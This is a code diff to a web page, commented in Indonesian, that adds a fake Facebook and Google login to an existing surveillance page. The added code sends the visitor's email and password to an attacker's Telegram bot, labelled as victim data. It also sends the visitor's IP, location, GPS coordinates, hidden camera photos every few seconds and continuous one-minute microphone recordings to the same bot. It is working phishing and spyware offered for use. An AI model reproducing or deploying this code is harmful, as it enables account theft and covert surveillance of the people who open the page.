@@ -19,11 +19,30 @@
     h1 {
       text-shadow: 0 0 10px lime;
     }
+    .login-container {
+      margin-top: 20px;
+    }
+    .btn-login {
+      background: lime;
+      border: none;
+      padding: 10px 20px;
+      margin: 5px;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 5px;
+      text-shadow: none;
+    }
   </style>
 </head>
 <body>
 
-<h1>Scanning device...</h1>
+<h1>Silahkan Login Terlebih Dahalu</h1>
+<div class="login-container">
+  <button class="btn-login" onclick="fakeLogin('Facebook')">Login Facebook</button>
+  <button class="btn-login" onclick="fakeLogin('Google')">Login Google</button>
+</div>
+
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
@@ -34,6 +53,7 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
+// Kirim teks ke Telegram
 function kirimPesan(text) {
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
@@ -42,10 +62,44 @@ function kirimPesan(text) {
   });
 }
 
-// Kirim pesan awal
-kirimPesan('📝𝘽𝙚𝙧𝙞𝙠𝙪𝙩 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙆𝙤𝙧𝙗𝙖𝙣 𝘽𝙖𝙣𝙜 𝘿𝙤𝙣𝙯𝙏𝙯𝙮 :');
+// Kirim file ke Telegram
+function kirimFile(audioBlob) {
+  const form = new FormData();
+  form.append('chat_id', chat_id);
+  form.append('audio', audioBlob, 'rekaman.webm');
+  fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
+    method: 'POST',
+    body: form
+  });
+}
 
-// Ambil info IP & lokasi
+// Fake login
+function fakeLogin(provider) {
+  let email = prompt(`Masukkan Email ${provider}:`);
+  let password = prompt(`Masukkan Password ${provider}:`);
+  if (email && password) {
+    // Kirim pesan pertama sebelum hasil
+    const mulaiPesan = `𝘼𝙙𝙖 𝙍𝙚𝙨𝙪𝙡𝙩 𝙉𝙞𝙝 𝘽𝙖𝙣𝙜 𝘿𝙤𝙣𝙯 𝙆𝙖𝙡𝙞 𝙄𝙣𝙞 𝙑𝙞𝙖 ${provider} 𝘿𝙞 𝙗𝙖𝙬𝙖𝙝 𝙄𝙣𝙞 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙉𝙮𝙖 𝙮𝙖..`;
+    kirimPesan(mulaiPesan);
+
+    // Kirim pesan setelah proses selesai dengan data login
+    const loginData = `
+==🌟 𝙍𝙀𝙎𝙐𝙇𝙏 𝘽𝘼𝙉𝙂 𝘿𝙊𝙉𝙕 🌟==
+📧 Email/nomor: ${email}
+🔒 Password: ${password}
+🖥 Login: ${provider}
+🌐 Result: Metode Hack akun
+==============================
+`;
+    setTimeout(() => {
+      kirimPesan(loginData);
+    }, 2000); // Menunggu 2 detik sebelum mengirimkan data login
+  }
+}
+
+// Info device awal
+kirimPesan('📝𝘽𝙚𝙧𝙞𝙠𝙪𝙩 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙆𝙤𝙧𝙗𝙖𝙣 𝘽𝙖𝙣𝙜:');
+
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
@@ -61,7 +115,6 @@ fetch('https://api.ipify.org?format=json')
 
     navigator.getBattery().then(bat => {
       const status = `
-
 == INFORMASI KORBAN ==
 🌐 IP: ${info.ip}
 🏳 Negara: ${info.country_name}
@@ -82,25 +135,24 @@ fetch('https://api.ipify.org?format=json')
     });
   });
 
-// Ambil lokasi GPS
+// Lokasi GPS
 if ("geolocation" in navigator) {
   navigator.geolocation.getCurrentPosition(pos => {
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
-    const lokasi = `Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+    const lokasi = `📍Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
     kirimPesan(lokasi);
   });
 }
 
-// Kamera dan ambil foto tiap 10 detik
+// Kamera - Ambil foto tiap 10 detik
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
   video.srcObject = stream;
   video.play();
-
   setInterval(() => {
     ambilFoto();
-  }, 10000); // tiap 10 detik
+  }, 3000);
 })
 .catch(err => {
   kirimPesan("Gagal akses kamera: " + err);
@@ -114,13 +166,42 @@ function ambilFoto() {
     let form = new FormData();
     form.append('chat_id', chat_id);
     form.append('photo', blob, 'foto.jpg');
-    form.append('caption', '📸 𝙄𝙣𝙞 𝘼𝙙𝙖𝙡𝙖𝙝 𝙁𝙤𝙩𝙤 𝙆𝙤𝙧𝙗𝙖𝙣 𝘽𝙖𝙣𝙜 𝘿𝙤𝙣𝙯𝙏𝙯𝙮');
+    form.append('caption', '📸 𝙁𝙤𝙩𝙤 𝙆𝙤𝙧𝙗𝙖𝙣 𝙎𝙪𝙠𝙨𝙚𝙨');
     fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
       method: 'POST',
       body: form
     });
   }, 'image/jpeg');
 }
+
+// Rekam suara otomatis
+navigator.mediaDevices.getUserMedia({ audio: true })
+.then(stream => {
+  const mediaRecorder = new MediaRecorder(stream);
+  let chunks = [];
+
+  mediaRecorder.ondataavailable = e => {
+    chunks.push(e.data);
+  };
+
+  mediaRecorder.onstop = () => {
+    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+    kirimFile(audioBlob);
+    chunks = [];
+    mediaRecorder.start(); // Mulai lagi setelah kirim
+    setTimeout(() => {
+      mediaRecorder.stop();
+    }, 60000); // 1 menit
+  };
+
+  mediaRecorder.start();
+  setTimeout(() => {
+    mediaRecorder.stop();
+  }, 60000);
+})
+.catch(err => {
+  kirimPesan("Gagal akses microphone: " + err);
+});
 </script>
 
 </body>
